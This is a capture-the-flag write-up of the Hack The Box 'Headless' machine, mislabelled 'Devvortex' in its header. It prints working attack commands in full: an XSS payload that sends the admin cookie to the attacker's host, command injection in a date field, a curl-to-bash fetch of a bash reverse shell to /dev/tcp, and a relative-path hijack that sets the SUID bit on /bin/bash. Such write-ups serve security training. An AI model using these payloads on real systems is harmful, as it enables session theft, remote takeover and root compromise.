---
layout: post
section-type: post
has-comments: true
title: Hack The Box - Devvortex
category: tech
tags: ["tutorial"]
---

### Reconnaissance and Initial Steps

##### Nmap Results

```
sudo nmap -Pn -sT -sU -sC -sV 10.10.11.242
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/14b8cd55-fcce-42df-bdf6-9d19d99017d7)

We add headless to /etc/hosts with the corresponding ip address given. Then navigate to `http://headless.htb:5000`


```
echo "10.10.11.8 headless.htb" | sudo tee -a /etc/hosts
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/3bd6636f-3891-49d6-988c-f4de867e7ce6)


##### Directory Enumeration

```
dirsearch -u http://headless.htb:5000
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/5a86b5e0-bb85-4ef3-a558-d560c4c57c70)

We can see that there are two pages available; /support and /dashboard. Let’s visit both of them to find our way into the machine.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/a17cd01d-309a-4ee0-baa7-3855e53f86f5)


To access the /dashboard, we either need to be logged in as a user with elevated privileges (admin) (but I don’t see a login page), or we need to trick the server into believing that we are authorized to access the URL. When considering how to trick the server, I think about providing it with either an admin cookie or an admin session ID.


### Getting Foothold on Headless

We need to provide a payload that can capture the cookies of the admin user who will be reviewing our support queries. The payload will look like this:

```
<script>document.location='http://<Your_Kali_IP>/?cookie='+document.cookie</script>
```

Additionally, we can URL encode this payload by pressing `Ctrl + u`. Along with this payload, we also need to start an HTTP server using the following command:

```
python3 -m http.server 80
```

At this stage, we need to test the XSS payload across all parameters present in the POST request, including message, email, User-Agent, and others. After testing, we'll discover that the same payload must be inserted into two specific parameters: message and User-Agent."

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/dbd01369-141b-45f5-b0d8-884309419e76)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/43e14dec-7e38-4660-9a73-7d54d846e2ca)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/cf518852-8d03-4af4-8e68-00115aa9f45b)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/d3dc3504-3fc2-4b05-89f2-d868462ee8d3)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/39e1ead3-99a7-4407-9864-7b7cd0760252)

After waiting for a minute, we can see that we have received the admin user's cookie. Now, we can add this cookie value to our browser using the inspect element feature or cookie editor add-on.

Navigate to `http://headless.htb:5000/dashboard` to access the Administrator Dashboard. Here, you'll encounter an option to generate the website's health report for a specific date. Let's intercept this request via Burp Suite and transfer another POST request to the repeater tool.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/1ccfa512-d5e0-4659-a0a0-714eba2024b7)


Within the body of this request, locate the date parameter. We'll attempt to detect a command injection vulnerability using this parameter by employing the following payload:

```
&& pwd
```
Additionally, we can URL encode this payload by pressing `Ctrl + u`. Now, let's send the request and check the response, where we will find that the date parameter is vulnerable to command injection.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/8d80e730-3305-4f7e-b23f-43491f7e8440)

I make a file named `payload.sh` with the following inside it.

```
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.16.18/4444 0>&1'
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/f839669f-b9fe-4b9b-9a63-6856ddb48762)

The IP address should be your IP address, and the port number `/4444` represents the port on which I'm going to open my netcat listener.

```
nc -nlvp 4444
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/8e527634-6ff3-4438-b867-e842a22ac53d)

finally run the Python3 HTTP server to host the file (payload.sh) using the following command

```
python3 -m http.server 8081
```

We want to insert a command that will fetch the payload file we created and run it. Make sure that you have your admin cookie listed in the cookie field. (don't forget `ctrl + u`)

```
curl http://10.10.16.18:8081/payload.sh|bash
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/08581364-7a9a-460a-81f8-4361f07c94d5)


We can see that the payload.sh file is downloaded by the web server and then executed which results in getting a reverse shell on our netcat listener.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/b8328dfb-3cf9-48d3-a726-a77c46c9651e)

get `user.txt`

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/cab10a6a-8533-4e2c-ac9f-b995b150d931)


### Privilege Escalation

Now, let's proceed to gain root access on the target machine. We'll initiate by checking the sudo privileges using the following command:

```
sudo -l
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/e6f89830-4912-4b7b-a2b0-d7f65bc5ab9a)


Upon execution, it's revealed that the `dvir` user possesses permission to execute the `/usr/bin/syschec`k binary as the root user. Let's inspect the contents of this binary.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/6f9a7877-300c-4df9-a061-daef38545a0a)


We'll discover that there's a bash script named `initdb.sh` that is executed without specifying its full path. Exploiting this vulnerability is straightforward; we create a malicious bash script with the same name. Executing the following commands accomplishes this:

```
echo "chmod u+s /bin/bash" > initdb.sh
```

```
chmod +x initdb.sh
```

Upon executing the `syscheck` binary, our malicious script in the current directory takes precedence. This script assigns the SUID bit of the root user to the /bin/bash file. To witness this in action, we run the command:

```
sudo /usr/bin/syscheck
```

Following this command execution, we proceed to execute `/bin/bash` with the owner's (root) privileges using the command:

```
/bin/bash -p
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/42b97909-aee5-4ae1-a7be-649999bfcd83)

After executing the above command, we'll observe that we have successfully escalated our privileges to the `root` user. Consequently, we can effortlessly access the contents of the `root.txt` file.




